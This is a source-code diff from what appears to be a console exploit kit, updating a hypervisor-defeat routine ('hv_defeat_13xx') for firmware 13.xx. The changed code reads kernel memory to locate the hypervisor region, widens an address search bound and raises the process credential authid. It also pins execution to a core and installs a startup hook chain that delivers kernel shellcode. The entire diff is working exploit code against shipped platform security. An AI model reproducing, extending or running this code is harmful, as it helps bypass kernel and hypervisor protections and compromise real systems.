@@ -182,7 +182,7 @@ static int check_nvs_signature(void) {
   return 0;
 }
 
-static uint64_t derive_h(void) {
+uint64_t derive_h(void) {
   uint64_t record;
 
   if (kernel_read(ktext + env_offset.HV_EFI_MAP_ROOT, &record, sizeof(record)) ||
@@ -230,7 +230,7 @@ static uint64_t derive_h(void) {
             return 0;
 
           if (memory_type == 0 && pages <= (UINT64_MAX >> 12) &&
-              physical_base && physical_base < 0x100000000) {
+              physical_base && physical_base < 0x1000000000) {
             uint64_t region_size = pages << 12;
 
             if (region_size > 0x17FFFFF && region_size < 0x4000001)
@@ -340,7 +340,7 @@ static int pin_to_core_reborn(int core) {
   return cpuset_setaffinity(3, 1, -1, 0x10, (const cpuset_t *)affinity);
 }
 
-static int install_startup_hook(uint64_t hv_base) {
+static int install_startup_hook(uint64_t hv_region, uint64_t hv_base) {
   khook_t hook;
   kh_chain_t chain;
   uint8_t chain_buffer[0x800];
@@ -375,7 +375,7 @@ static int install_startup_hook(uint64_t hv_base) {
                  ktext + env_offset.MP_STARTUP_INIT_VECTOR);
   kh_chain_store(&chain, carrier + 0xF08, dmap);
   kh_chain_store(&chain, carrier + 0xF10, oracle);
-  kh_chain_store(&chain, carrier + 0xF18, hv_base);
+  kh_chain_store(&chain, carrier + 0xF18, hv_region);
   kh_chain_store(&chain, carrier + 0xF20, heap_pointer_slot);
   kh_chain_store(&chain, carrier + 0xF28, pcpus_pointer_slot);
   kh_chain_store(&chain, carrier + 0xF30, 1);
@@ -392,6 +392,7 @@ static int install_startup_hook(uint64_t hv_base) {
 }
 
 int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
+  uint64_t hv_region;
   uint64_t hv_base;
   uint64_t ist_pa;
   uint64_t ist;
@@ -412,12 +413,15 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
     return -1;
   }
 
-  hv_base = derive_h();
-  if (!hv_base) {
+  hv_region = derive_h();
+  if (!hv_region) {
     if (fw == 0x1360)
       notify("13.60 hypervisor base was not found\n");
     return -1;
   }
+  hv_base = hv_region + (linux_i.kit_type == KIT_RETAIL_PRO
+                              ? HV_CODE_OFFSET_PRO
+                              : 0);
 
   kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
   result = pin_to_core_reborn(0);
@@ -426,7 +430,8 @@ int hv_defeat_13xx(void *shellcode_kernel, size_t shellcode_kernel_len) {
       notify("13.60 core pin failed (%d)\n", result);
     return -1;
   }
-  result = install_startup_hook(hv_base);
+
+  result = install_startup_hook(hv_region, hv_base);
   if (result) {
     if (fw == 0x1360)
       notify("13.60 startup hook failed (%d)\n", result);
